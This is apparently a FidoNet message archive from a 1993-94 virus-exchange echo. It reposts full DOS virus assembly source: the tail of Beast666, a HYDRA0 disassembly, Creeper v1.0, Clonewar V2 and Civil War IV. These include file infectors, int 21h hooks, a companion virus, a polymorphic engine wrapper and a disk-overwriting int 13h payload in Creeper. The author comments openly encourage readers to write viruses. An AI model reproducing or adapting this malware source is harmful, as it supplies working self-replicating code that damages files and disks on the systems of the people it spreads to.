        mov DosSeg,ax   ; Save DOS segment for further usage
        mov ds,ax       ; DS now point in DOS segment

        call    SearchDos   ; Search DOS entry point
        call    SearchStack ; Search DOS stack

        push    cs      ; DS=ES=CS
        push    cs
        pop ds
        pop es

        mov ax,DosSeg   ; get DOS segment in AX
        mov cl,4        ; AX*=16
        shl ax,cl
        mov bx,StackOff ; Stack new begin in BX
        and bx,0FFF0h   ; Mask low 4 bit
        add ax,bx       ; Compute new real address
        mov cl,4        ; AX/=16
        shr ax,cl       ; Now we get SEGMENT:0000
        sub ax,10h      ; Segment-=10-> SEG:100h
        mov StackOff,ax ; Save new segment for further usage
        mov es,ax       ; ES point in DOS New area
        mov si,100h     ; ES:DI -> DOS:free_space_in_stack
        mov di,si       ; DS:SI Current segment
        mov cx,512d     ; Virus is only 512 bytes long
        rep movsb       ; Move virus to new place

; Installing virus in DOS' stack we will avoid a conflict with PCTools,
; MAPMEM, and other sys software. Remark, that no one DOS buffer wasn't
; affected, so if you have program, that count DOS' buffers to found
; Beast666, she won't found anything.
; In further release of full virus I will include anti-debugger system,
; so you will not be able to trace virus

        mov di,DosOff   ; ES:DI point to DOS int21 entry point
        mov ax,DosSeg
        mov es,ax
        mov al,0EAh     ; JMP   XXXX:YYYY
        stosb
        mov ax,offset Entry21
        stosw           ; New 21 handler's offset
        mov ax,StackOff
        stosw           ; New 21 handler's segment


; Now DOS will make far jump to virus. In case that virus won't
; get vector 21 directly, MAPMEM-like utilities won't show int 21 catching,
; and DOSEDIT will operate correctly (with several virus he don't).

        inc di
        inc di
        mov Int21off,di ; Virus will call DOS after jump
        jmp ReturnControl   ; Return control to file

; At this moment, return control is just terminate program via int 20h.
; In further release of full virus this subroutine will be able to
; return control to any file (COM or EXE).



; These are two scanners subroutine. All they do are scanning DOS segment
; for several well-known bytes. Then they update some iternal variables.
; Be patience, when debug this area!

SearchDos
        mov ax,cs:[DosSeg]
        mov ds,ax
        xor si,si

Search1
        lodsw
        cmp ax,3A2Eh
        je  NextDos1
        dec si
        jmp short Search1
NextDos1
        lodsb
        cmp al,26h
        je  LastDos
        sub si,2
        jmp short Search1
LastDos
        inc si
        inc si
        lodsb
        cmp al,77h
        je  FoundDos
        sub si,5
        jmp short Search1
FoundDos
        inc si
        mov cs:[Int21off],si
        sub si,7
        mov cs:[DosOff],si
        ret

SearchStack
        xor si,si
Search2
        lodsw
        cmp ax,0CB8Ch
        je  NextStack1
        dec si
        jmp short Search2
NextStack1
        lodsw
        cmp ax,0D38Eh
        je  NextStack2
        sub si,3
        jmp short Search2
NextStack2
        lodsb
        cmp al,0BCh
        je  FoundStack
        sub si,4
        jmp short Search2
FoundStack
        mov di,si
        lodsw
        sub ax,200h
        stosw
        mov cs:[StackOff],ax
        ret

Entry21                 ; Here is new int 21 handler
        cmp ah,52h      ; If GET_LIST_OF_LISTS
        jne NextCheck

        mov ax,1234h    ; then probably I am here
        mov bx,cs:[DosSeg]  ; so return special bytes in AX
        mov es,bx
        mov bx,26h
        iret            ; Terminate AH=52h->return to caller
NextCheck
        cmp ax,4B00h    ; If EXEC file
        jne GoDos
        call    Infect      ; then file will be infected
GoDos
        jmp dword ptr cs:[Int21off]
                    ; Otherwise jump to DOS
Infect
        push    ds      ; At this moment just write on screen
        push    dx
        push    ax

        push    cs
        pop ds
        mov dx,offset Txt
        mov ah,9
CallDos
        pushf           ; Call real DOS
        call    dword ptr cs:[Int21off]

        pop ax
        pop dx
        pop ds
        ret

Int21off    dw  0   ; Offset of DOS 21 AFTER jump to virus
DosSeg      dw  0   ; DOS segment
StackOff    dw  0   ; Offset of stack/New segment
DosOff      dw  0   ; Offset of DOS 21 BEFIRE jump
Txt     db  'Infect File$'  ; Dummy text

-+-  FMail 0.96т
 + Origin: FidoNet * Mathieu NotВris * Brussels-Belgium-Europe (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/Twx          Windows image

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 54 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : HYDRA_0.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f5f
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Gilbert Holleman, 2:283/718 (06 Nov 94 16:44)
* To   : Mark Hapershaw
* Subj : HYDRA_0.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Gilbert.Holleman@f718.n283.z2.fidonet.org
PAGE  59,132

;██████████████████████████████████████████████████████████████████████████
;██                                      ██
;██                 HYDRA0                       ██
;██                                      ██
;██                                                                      ██
;██  Disassembly by: -=>Wasp<=- aka >>Night Crawler<<                    ██
;██                                                                      ██
;██  Reassemble with TASM 2.0                                            ██
;██████████████████████████████████████████████████████████████████████████

DATA_1E     EQU 80H
DATA_18E    EQU 2E0H
DATA_19E    EQU 2E3H

SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A


        ORG 100h

HYDRA0      PROC    FAR

START:
        JMP LOC_1           ; (0225)
        DB   59H, 44H, 00H, 00H
DATA_4      DB  'HyDra     Beta - Not For Release'
        DB  '. *.CO?'
        DB  0
DATA_7      DW  0, 84FCH
DATA_9      DW  0
DATA_10     DB  0
        DB  29 DUP (0)
DATA_11     DB  0
        DB  13 DUP (0)
COPYRIGHT   DB  'Copyright (c)'
DATA_12     DB  '  1991 by C.A.V.E.  HYDRA$'
        DB  'Watch for the many heads.', 0DH, 0AH
        DB  0DH, 0AH, 0DH, 0AH, 0DH, 0AH, 0DH
        DB  0AH, 0DH, 0AH, 0DH, 0AH, 'The fir'
        DB  'st eight are easy to find and ki'
        DB  'll.', 0DH, 0AH, 0DH, 0AH, 'Their'
        DB  ' replacements will be more sophi'
        DB  'sticated.$'
        DB  '(c) 1991  -  C. A. V. E.$'
LOC_1:
        PUSH    AX
        MOV AX,CS
        ADD AX,1000H
        XOR DI,DI           ; Zero register
        MOV CX,2E0H
        MOV SI,OFFSET DS:[100H]
        MOV ES,AX
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AH,1AH
        MOV DX,OFFSET DATA_10
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        MOV DX,OFFSET DATA_4+22H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_5           ; Jump if carry Set
LOC_2:
        MOV AH,3DH          ; '='
        MOV AL,2
        MOV DX,OFFSET DATA_11
        MOV AL,2
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        PUSH    ES
        POP DS
        MOV AX,3F00H
        MOV CX,0FFFFH
        MOV DX,DATA_18E
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        ADD AX,2E0H
        MOV CS:DATA_9,AX
        CMP WORD PTR DS:DATA_19E,4459H
        JNE LOC_3           ; Jump if not equal
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_6           ; Jump if carry Set
        JMP SHORT LOC_2     ; (0247)
LOC_3:
        XOR CX,CX           ; Zero register
        MOV DX,CX
        MOV AX,4200H
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_4           ; Jump if carry Set
        MOV AH,40H          ; '@'
        XOR DX,DX           ; Zero register
        MOV CX,CS:DATA_9
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_4:
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
LOC_5:
        MOV AH,1AH
        MOV DX,DATA_1E
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        JMP SHORT LOC_7     ; (02F0)
        DB  90H
LOC_6:
        PUSH    DX
        XOR AX,AX           ; Zero register
        MOV AX,0F00H
        INT 10H         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
        MOV AH,0
        INT 10H         ; Video display   ah=functn 00h
                        ;  set display mode in al
        MOV AX,200H
        MOV DH,6
        MOV DL,25H          ; '%'
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        XOR DX,DX           ; Zero register
        MOV DX,OFFSET DATA_12+14H
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,0BH
        MOV DL,1BH
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV DX,OFFSET DATA_12+1AH
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,17H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV DX,OFFSET DATA_12+9EH
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,18H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV AX,4C00H
        INT 21H         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
LOC_7:
        XOR DI,DI           ; Zero register
        MOV SI,OFFSET DATA_16
        MOV CX,0D3H
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        POP BX
        MOV CS:DATA_7,0
        MOV WORD PTR CS:DATA_7+2,ES
        POP BX
        JMP DWORD PTR CS:DATA_7
DATA_16     DB  1EH
        DB   07H,0B9H,0FFH,0FFH,0BEH,0E0H
        DB   03H,0BFH, 00H, 01H, 2BH,0CEH
        DB  0F3H,0A4H, 2EH,0C7H, 06H, 00H
        DB   01H, 00H, 01H, 2EH, 8CH, 1EH
        DB   02H, 01H, 8BH,0C3H, 2EH,0FFH
        DB   2EH, 00H, 01H
        DB  '  Coalition  of   American  Viru'
        DB  's   Engineers         -=-=-     '
        DB  '  Dedicated  to  supporting  the'
        DB  '   anti-virus    industry withou'
        DB  't recognition or reward.        '
        DB  '      -=-=-      '
        DB  0CDH, 20H

HYDRA0      ENDP

SEG_A       ENDS



        END START

-+-  PPoint 1.86
 + Origin: **SERMEDITECH BBS** Soissons FR (+33) 23.73.02.51 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

Options:      /m = map file with publics

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 55 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : CREEPER.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f69
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Ron Toler, 2:283/718 (06 Nov 94 16:45)
* To   : Mike Salvino
* Subj : CREEPER.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
;
;   Demoralized Youth proudly presents: Creeper v1.0, Original Source
;
;           Written by: TORMENTOR
;
;   Yez, here it is... It's not like 4096 or Pogue, but it's a virus!
;   The reason why I release the original source is that I think I
;   can't do much more on this virus... I will start from scratch
;   and write a larger and more smarter EXE-virus...
;   And if I release this source maybe YOU will get some god ideas and
;   write your own virus (or rewrite this!)...
;   And if you do, Great! Feel free to mix with it as much as you want
;   but please don't change this file!
;   Well, go on and write virus! The world is to safe!
;
;
;   Regards / TORMENTOR
;

code        segment byte public
        assume  cs:code, ds:code, es:code, ss:code


        org 100h


codebeg:


        mov ax,043FFh       ; Remove virus from code!
        int 21h

; Let's allocate some mem!

        mov ax,ds
        sub ax,11h
        mov ds,ax
        cmp byte ptr ds:[0100h],5Ah
        jnz skip
        mov ax,ds:[0103h]
        sub ax,40h
        jb  skip
        mov ds:[0103h],ax
        sub word ptr ds:[0112h],50h
        mov es,ds:[0112h]
        push    cs
        pop ds
        mov cx,code_end-codebeg
        mov di,100h
        push    di
        mov si,di
        rep movsb

        push    es
        pop ds

        mov ax,351Ch
        int 21h
        mov word ptr ds:[int1Cret],bx
        mov word ptr ds:[int1Cret+2],es
        mov al,21h
        int 21h
        mov word ptr ds:[real21+1],bx
        mov word ptr ds:[real21+3],es

        mov ah,25h
        mov dx,offset int21beg
        int 21h
        mov al,1Ch
        mov dx,offset int1Cnew
        int 21h

        push    cs
        push    cs
        pop es
        pop ds

        ret

skip:       int 20h


int21beg:   push    ax
        sub ax,4B00h
        jz  infect
        pop ax
        cmp ax,043FFh       ; Check if Harakiri.
        jne real21

        mov ax,word ptr ds:[retdata]
        mov si,ax
        mov di,100h
        mov cx,code_end-codebeg
        rep movsb

        mov ax,100h

        pop cx
        pop cx
        push    es
        push    ax
        iret

real21:     db  0EAh, 00h, 00h, 00h, 00h    ; Jump to org21vec.


retdata:    db  00h, 00h

f_time:     dw  0000h

f_date:     dw  0000h

infect:     pop ax

        push    ax
        push    bx
        push    cx
        push    di
        push    ds
        push    dx
        push    si


        mov ah,43h          ; Get file attr.
        int 21h
        mov ax,4301h
        and cx,0FEh         ; Strip the Read-only-flag
        int 21h

        mov ax,3D02h        ; Open victim.
        int 21h

        xchg    ax,bx

        call    sub_2

sub_2:      mov di,sp           ; God what I hate that Eskimo!
        mov     si,ss:[di]
        inc sp
        inc sp

        push    cs
        pop ds

        mov ax,5700h        ; Get file's time and date
        int 21h
        mov [si-(sub_2-f_time)],cx
        mov [si-(sub_2-f_date)],dx  ; And save them...

        mov ah,3Fh          ; Read X byte from begin.
        mov cx,code_end-codebeg
        add si,code_end-sub_2   ; SI points to EOF
        mov dx,si
        int 21h


        cmp word ptr [si],'MZ'  ; Mark Zimbowski?
        je  close
        cmp word ptr [si],'ZM'  ; Zimbowski Mark?
        je  close
mark:       cmp word ptr [si+(mark-codebeg+4)],'YD' ; infected?
        je  close

        call    put_eof         ; move file ptr to EOF

        cmp ax,(0FFFFh-(code_end-codebeg)-100h)
        ja  close
        cmp ax,code_end-codebeg+100h
        jb  close

        add ax,100h
        mov word ptr ds:[si-(code_end-retdata)],ax

        mov ah,40h          ; Flytta beg to end.
        mov cx,code_end-codebeg
        mov dx,si
        int 21h

        mov ax,4200h        ; fptr to filbeg.
        xor     cx,cx
        xor     dx,dx
        int 21h

        mov ah,40h          ; Write virus to beg.
        mov cx,code_end-codebeg
        mov dx,si
        sub dx,cx
        int 21h

close:      mov ax,5701h
        mov cx,[si-(code_end-f_time)]
        mov dx,[si-(code_end-f_date)]
        int 21h

        mov ah,3Eh
        int 21h         ; close file, bx=file handle

        pop si
        pop dx
        pop ds
        pop di
        pop cx
        pop bx
        pop ax


        jmp real21

put_eof:    mov     ax,4202h
        xor dx,dx
        xor cx,cx
        int     21h
        ret


int1Cnew:

        push    ax
        inc     byte ptr cs:[counter]
        mov     al,30h
        cmp     byte ptr cs:[counter],al
        jz  scan
        pop     ax


slut:       jmp     dword ptr cs:[int1Cret]

scan:
        push    bx
        push    cx
        push    di
        push    ds
        push    dx
        push    es
        push    si


        push    cs
        pop     ds

        cld
        xor     bx,bx
        mov     byte ptr cs:[counter],bh
        mov     cx,0FA0h

        mov     ax,0b800h
        mov     es,ax
        xor     di,di

again:      mov     al,byte ptr cs:[text+bx]
        sub al,80h
        repnz   scasb
        jnz     stick

maybe:      inc     di
        inc     bx
        cmp     bx,10d
        jz  beep

        mov al,byte ptr cs:[text+bx]
        sub al,80h
        scasb
        jz  maybe
        xor bx,bx
        jmp again

beep:
        xor cx,cx
        mov bx,word ptr cs:[int1Cret]
        mov es,word ptr cs:[int1Cret+2]
        mov ax,251Ch
        int 21h

overagain:  mov dx,0180h
        xor bx,bx

reset:      mov ah,00h
        inc bx
        cmp bl,5h
        jz  raise
        inc cx
        int 13h

hoho:       mov ax,0380h
        inc cx
        int 13h
        jc  reset
        jmp     hoho

raise:      xor cx,cx
        xor bx,bx
        inc dx
        cmp dl,85h
        jnz hoho
        jmp overagain

stick:
        pop si
        pop es
        pop dx
        pop     ds
        pop     di
        pop     cx
        pop     bx
        pop     ax


        jmp     slut


counter:    db  00h

text:       db  'T'+80h, 'O'+80h, 'R'+80h, 'M'+80h, 'E'+80h, 'N'+80h
        db  'T'+80h, 'O'+80h, 'R'+80h, '!'+80h

            ; This is what it scans the screen for --^

int1Cret:   db  0EAh, 00h, 00h, 00h, 00h

code_end:                   ; THE END.

code        ends
end     codebeg

;
;  Greetings to: Charlie, HITMAN, Wiper, Torpedo, Tortuer, WiCO, Drive Screwer
;  And ALL other virus-writers!
;

-+-  FidoPCB v1.4 [NR]
 + Origin: Hans' Point with DOSBoss West, Amsterdam (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/Txx          Specify output file type

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 56 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : CLONWAR2.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f6f
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Fred Lee, 2:283/718 (06 Nov 94 16:47)
* To   : Bryan Sullivan
* Subj : CLONWAR2.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Fred.Lee@f718.n283.z2.fidonet.org
;Clonewar V2.0
;┌───────────────────────────────────────────────────────────────────────────┐
;│  Assembly Source Listing for Clonewar V2 Companion Virus                  │
;│  Copyright (c) 1993  All Rights Reserved. :)                              │
;├───────────────────────────────────────────────────────────────────────────┤
;│ The Clonewar is a direct action companion virus. This version is simply   │
;│ a partial code optimization of the original....                           │
;│                                                                           │
;└───────────────────────────────────────────────────────────────────────────┘

CSEG            SEGMENT
                ASSUME  CS:CSEG,DS:NOTHING

                ORG   100H

START:
                jmp  VIR_BEGIN         ;lets get moving...


;               db  "[CloneWar2]"      ;i really hate the waste...
WILDCARD        DB  "*.EXE",0
FILE_EXT        DB  "COM",0
FILE_FOUND      DB  12 DUP(' '), 0
FILE_CREATE     DB  12 DUP(' '), 0
SEARCH_ATTRIB   DW  17H
NUM_INFECT      DW  0


My_Cmd:
CMD_LEN         DB  13
FILE_CLONE      DB  12 DUP (' '), 0

;─────────────────────────────────────────────────────────────────────
; Read all the directory filenames and store as records in buffer.
;─────────────────────────────────────────────────────────────────────

Vir_begin:

           mov    sp,offset STACK_HERE   ;move stack down
           mov    bx,sp
           add    bx,15
           mov    cl,4
           shr    bx,cl
               mov    ah,4ah                 ;deallocate rest of memory
           int    21h

           mov    di,OFFSET FILE_CLONE   ;Point to buffer.
           mov    si,OFFSET FILE_FOUND
           mov    cx,12
           rep    movsb

Read_dir:      mov    dx,OFFSET WILDCARD     ;file mask for directory search
           mov    cx,SEARCH_ATTRIB

               mov    ah,4Eh                 ;find first matching file
           int    21h

               jc     EXIT                   ;If empty directory, exit

;────────────────────────────────────────────────────────────────────────

Store_name:

           mov    di,OFFSET FILE_FOUND   ;Point to buffer.
           mov    si,158                 ;stow the file found in buffer
           mov    cx,12
           rep movsb

           mov    di,OFFSET FILE_CREATE  ;Point to buffer.
           mov    si,158
           mov    cx,12
           rep movsb

           cld
           mov    di,OFFSET FILE_CREATE
           mov    al,'.'
           mov    cx,9
           repne scasb                   ;find the '.'

           mov    si,OFFSET FILE_EXT
           mov    cx,3
           rep movsb                     ;replace the .EXE with .COM
                         ;from buffer

;─────────────────────────────────────────────────────────────────────

Check_file:                                  ;does the file exist?
           mov    dx,OFFSET FILE_CREATE
               xor    cx,cx
               mov    ax,3d00h               ;Open file, read only
           int    21h
               jnc    find_next

;──────────────────────────────────────────────────────────────────────
Infect_file:                                 ;create companion routine

               mov    dx,OFFSET FILE_CREATE  ;contains name of "companion"
               xor    cx,cx
               mov    ah,3ch                 ;construct file
           int    21h
           jc     EXIT

                                             ;Write virus to companion file
               xchg   bx,ax
               mov    cx,(OFFSET END_OF_CODE - OFFSET START)  ;virus length
           mov    dx,OFFSET START
               mov    ah,40h                 ;write to file function
               int    21h                    ;do it

                                             ;Close file
               mov    ah,3eh                 ;assumes bx still has file handle
           int    21h

                                             ;Change attributes
               mov    dx,OFFSET FILE_CREATE  ;of created file to
               mov    cx,3                   ;(1) read only and (2) hidden
           mov    ax,4301h
           int    21h
               jmp    prepare_command

;──────────────────────
;...findnext...
;──────────────────────
find_next:
              mov     ah, 4fh                ;find next...
              int     21h
              jmp     store_name
;──────────────────────────────────────────────────────────────────────
Prepare_command:

           cld
           mov    di,OFFSET FILE_CLONE
           mov    al,0
           mov    cx,12
               repne scasb                   ;find the end of string \0

               mov    al,0Dh                 ;<CR>
               stosb                         ;replace \0 with a <CR>

               mov    ax,12                  ;store length of the command
           sub    ax,cx
           mov    CMD_LEN, al

;──────────────────────────────────────────────────────────────────────

Exit:
                                             ;Run the original program
           mov    si, OFFSET MY_CMD
               int    2Eh                    ;Pass command to command
                                             ;interpreter for execution
               mov    ax,4C00H               ;Exit to DOS
           int    21h


END_OF_CODE     =       $

STACK_HERE      EQU   END_OF_CODE + 512

CSEG            ENDS
                END      START

-+-  FidoPCB v1.4 [NR]
 + Origin: Fred's Place (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/L            Specify library search paths

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 57 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:13 
 To   : -  *.*  -                                                               
 Subj : CIVIL411.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f75
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Dr T , 2:283/718 (06 Nov 94 16:48)
* To   : Mike Nisbett
* Subj : CIVIL411.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Dr.T.@f718.n283.z2.fidonet.org
;****************************************************************************
;*   Civil War IV v1.1 (minor bugfix version)                   *
;*                                          *
;*   Assembled with Tasm 2.5                            *
;*                                          *
;*   (c) 08-01-93 Dark Helmet, The Netherlands.                 *
;*   The author takes no responsibilty for any damages caused by the virus  *
;*                                          *
;*   This is a example virus with the TPE engine to teach you how to use    *
;*   the TPE engine.                                *
;*                                      *
;*--------------------------------------------------------------------------*
;*                                      *
;* Notes:                                   *
;*                                      *
;* This virus is NOT dedicated to Sara Gordon, but to all the innocent      *
;* people who are killed in Yugoslavia.                     *
;*                                      *
;* The text in the virus is taken from the song Civil War (hence the name)  *
;* by Guns and Roses, Use Your Illusion II, we hope they don't mind it.     *
;*                                      *
;* The first name for the virus was NAVIGATOR II, because the virus is      *
;* based on the NAVIGATOR virus (also written by me, a while back), but     *
;* since I decided to put the songtext in it I renamed it to Civil War IV   *
;*                                      *
;* You need the TPE 1.3 engine to link this program.                *    *
;*                                      *
;****************************************************************************

        .model tiny
        .radix 16
        .code

        extrn   rnd_init:near
        extrn   rnd_get:near
        extrn   crypt:near
        extrn   tpe_top:near

        org 100h

len     equ offset tpe_top - begin

Dummy:          db 0e9h, 03h, 00h, 44h, 48h, 00h

Begin:          call virus          ; calculate delta offset

Virus:          pop bp
                sub bp,offset virus

                mov dx,0fe00h           ; DTA instellen
                mov ah,1ah
                int 21h

Restore_begin:  call rnd_init           ; init random generator
        mov di,0100h
        lea si,ds:[buffer+bp]
        mov cx,06h
        rep movsb

First:      lea dx,[com_mask+bp]        ;get first COM file
        mov ah,04eh
        xor cx,cx
        int 21h

Open_file:  mov ax,03d02h           ;open for READ/WRITE
        mov dx,0fe1eh
        int 21h
        mov [handle+bp],ax
        xchg ax,bx

Read_date:  mov ax,05700h           ;store date/time for later
        int 21h             ;use
        mov [date+bp],dx
        mov [time+bp],cx

Check_infect:   mov bx,[handle+bp]      ;check if initials present in
        mov ah,03fh         ;file
        mov cx,06h
        lea dx,[buffer+bp]
        int 21h

                mov al,byte ptr [buffer+bp]+3   ;Compare initials
        mov ah,byte ptr [buffer+bp]+4
        cmp ax,[initials+bp]
        jne infect_file         ;if initials not present
                        ;start infecting file

Close_file:     mov bx,[handle+bp]      ;close file
        mov ah,3eh
        int 21h

Next_file:      mov ah,4fh          ;get next COM file
        int 21h             ;in directorie
        jnb open_file
        jmp exit

Infect_file:    mov ax,word ptr [cs:0fe1ah] ;get lenght of file
        sub ax,03h
        mov [lenght+bp],ax
        mov ax,04200h           ;goto begin of file
        call move_pointer

Write_jump:     mov ah,40h          ;Write JUMP intruction
        mov cx,01h
        lea dx,[jump+bp]
        int 21h

        mov ah,40h          ;Write JUMP offset
        mov cx,02h
        lea dx,[lenght+bp]
        int 21h

        mov ah,40           ;Write initials to check
        mov cx,02h          ;for infection later
        lea dx,[initials+bp]
        int 21h

        mov  ax,4202h           ; move to end of file
        call move_pointer       ; for infection

;*****************************************************************************
;                   T P E                        *
;*****************************************************************************

Encrypt:    push bp             ; BP = delta offset
                        ; push delta offset on stack
                        ; for later use.

        mov ax,cs           ; Calculate worksegment
        add ax,01000h
        mov es,ax           ; ES point to decrypt virus

        lea dx,[begin+bp]       ; DS:DX begin encryption

        mov cx,len          ; virus lenght

        mov bp,[lenght+bp]      ; decryption starts at this
        add bp,103h         ; point

        xor si,si           ; distance between decryptor
                        ; and encrypted code is 0 bytes

        call rnd_get            ; AX = random value
        call crypt          ; encrypt virus

        pop bp              ; BP = delta offset
                        ; get delta offset of stack

;******************************************************************************
;               T P E - E N D                     *
;******************************************************************************

Write_virus:    mov bx,[handle+bp]
        mov ah,40h
        int 21h

Restore_date:   mov ax,05701h
        mov bx,[handle+bp]
        mov cx,[time+bp]
        mov dx,[date+bp]
        int 21h

Exit:       mov ax,cs
        mov ds,ax
        mov es,ax
        mov bx,0100h            ; jump to start program
        jmp bx

;----------------------------------------------------------------------------

move_pointer:   mov bx,[handle+bp]
        xor cx,cx
        xor dx,dx
        int 21h
        ret

;----------------------------------------------------------------------------
v_name      db "Civil War IV v1.1, (c) Jan '93 "
com_mask    db "*.com",0
handle      dw ?
date        dw ?
time        dw ?
buffer          db 090h,0cdh,020h,044h,048h,00h
initials        dw 4844h
lenght      dw ?
jump            db 0e9h,0
message     db "For all i've seen has changed my mind"
        db "But still the wars go on as the years go by"
        db "With no love of God or human rights"
        db "'Cause all these dreams are swept aside"
        db "By bloody hands of the hypnotized"
        db "Who carry the cross of homicide"
        db "And history bears the scars of our Civil Wars."
writer      db "[ DH / TridenT ]",00

        end  dummy

-+-  PPoint 1.86
 + Origin: - = [ Brainstorm BBS ++31 (0)20-6108189 ] = - (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/yx           Extended memory swapping

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
